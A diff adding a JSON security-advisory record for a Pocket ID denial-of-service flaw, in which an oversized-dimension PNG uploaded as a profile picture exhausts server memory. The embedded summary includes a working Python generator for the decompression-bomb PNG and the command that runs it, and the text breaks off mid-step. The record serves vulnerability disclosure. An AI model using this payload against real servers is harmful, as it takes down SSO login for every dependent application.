@@ -1,0 +1,51 @@
+{
+  "id": "GHSA-53gh-fffg-5f7f",
+  "aliases": [],
+  "title": "Denial of service via image decompression bomb in profile-picture upload",
+  "summary": "## Summary\r\nAny authenticated user can crash the entire Pocket ID server by uploading a small,\r\nspecially-crafted image as their profile picture. The uploaded image is fully decoded into an\r\nin-memory bitmap **before** any dimension, pixel-count, or file-size limit is applied, so a tiny\r\nfile that declares enormous pixel dimensions (a \"decompression bomb\") forces a huge memory\r\nallocation. A handful of such uploads - a few kilobytes each - exhaust the host's memory and the\r\nLinux OOM killer terminates the `pocket-id` process. Because Pocket ID is the OIDC/SSO authority,\r\nits outage denies login to every downstream application that relies on it.\r\n\r\n## Details\r\nThe self-service endpoint `PUT /api/users/me/profile-picture`\r\n([`user_controller.go#L46`](https://github.com/pocket-id/pocket-id/blob/fa8aa447061fd096184ac9e7c3511c62087b3f8c/backend/internal/controller/user_controller.go#L46),\r\ngated by `authMiddleware.WithAdminNotRequired()` → any authenticated non-admin user) passes the\r\nuploaded file to `UserService.UpdateProfilePicture` → `profilepicture.CreateProfilePicture`.\r\nThat function decodes the image first and only then resizes it:\r\n\r\n```go\r\n// backend/internal/utils/image/profile_picture.go\r\nfunc CreateProfilePicture(file io.ReadSeeker) (io.ReadSeeker, error) {\r\n    img, _, err := imageorient.Decode(file)          // (1) decodes fully: allocates ~width*height*channels\r\n    ...\r\n    img = imaging.Fill(img, 300, 300, ...)           // (2) resize happens only AFTER the full decode\r\n```\r\n\r\nTwo compounding problems:\r\n\r\n1. **No dimension / pixel-count guard before decode.** `imageorient.Decode` (and the WebP\r\n   fallback) allocate memory proportional to the image's *declared* `width × height`, which is\r\n   independent of the compressed file size. There is no `image.DecodeConfig` pre-check to reject\r\n   oversized images. A ~140 KB grayscale PNG that declares 12000×12000 decodes to ~144 MP; a\r\n   ~762 KB PNG declaring 28000×28000 decodes to ~784 MP.\r\n\r\n2. **No size-limit middleware on the route.** Unlike the OIDC client-logo upload - which is\r\n   wrapped with `fileSizeLimitMiddleware.Add(2<<20)` - the profile-picture routes have no size\r\n   limit at all\r\n   ([`user_controller.go#L45-L46`](https://github.com/pocket-id/pocket-id/blob/fa8aa447061fd096184ac9e7c3511c62087b3f8c/backend/internal/controller/user_controller.go#L45-L46)).\r\n\r\nThe decoded memory is also not promptly returned to the OS, so repeated uploads accumulate.\r\nThe same decode path is reachable (admin-gated) through the client-logo upload and through\r\n`OidcService.downloadAndSaveLogoFromURL` (`StripMetadata`), which decode images through the same\r\nlibraries and lack the same dimension guard.\r\n\r\n**Preconditions:** a valid account and session (any non-admin user; `PR:L`). No user\r\ninteraction, default configuration. On a memory-limited deployment (a container with a\r\n256 MB-1 GB limit, common for self-hosting) a **single** small upload is sufficient.\r\n\r\n## Proof of Concept\r\nOn an isolated local instance (all traffic on 127.0.0.1):\r\n\r\n1. Build & run the backend at the tested commit and complete initial admin setup; create a\r\n   normal non-admin user and obtain its session cookie (via the admin one-time-access-token\r\n   exchange).\r\n2. Craft a decompression-bomb PNG - a small file that declares huge dimensions (grayscale,\r\n   all-zero scanlines). Minimal generator (`poc/pngbomb.py`):\r\n   ```python\r\n   import sys, struct, zlib\r\n   W = H = int(sys.argv[1]); out = sys.argv[2]\r\n   def chunk(t, d): return struct.pack(\">I\", len(d)) + t + d + struct.pack(\">I\", zlib.crc32(t+d) & 0xffffffff)\r\n   co = zlib.compressobj(9); idat = bytearray(); row = b\"\\x00\" + b\"\\x00\"*W\r\n   for _ in range(H): idat += co.compress(row)\r\n   idat += co.flush()\r\n   open(out, \"wb\").write(b\"\\x89PNG\\r\\n\\x1a\\n\" + chunk(b\"IHDR\", struct.pack(\">IIBBBBB\", W, H, 8, 0, 0, 0, 0)) + chunk(b\"IDAT\", bytes(idat)) + chunk(b\"IEND\", b\"\"))\r\n   ```\r\n   `python3 poc/pngbomb.py 12000 bomb.png`  →  a **140 KB** file that decode...",
+  "published_at": "2026-10-09T18:05:19.000Z",
+  "modified_at": "2026-10-09T18:05:19.000Z",
+  "severity": {
+    "level": "medium",
+    "score": null,
+    "vector": null,
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-400",
+    "CWE-409"
+  ],
+  "affected": [
+    {
+      "product": "pocket-id",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "2.15.0"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-53gh-fffg-5f7f",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-53gh-fffg-5f7f",
+      "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-53gh-fffg-5f7f",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:cf8390f47a62cf71f1fff72cc66baa968fbad35e646429d86b2f30aa9c05436a",
+  "note": null
+}
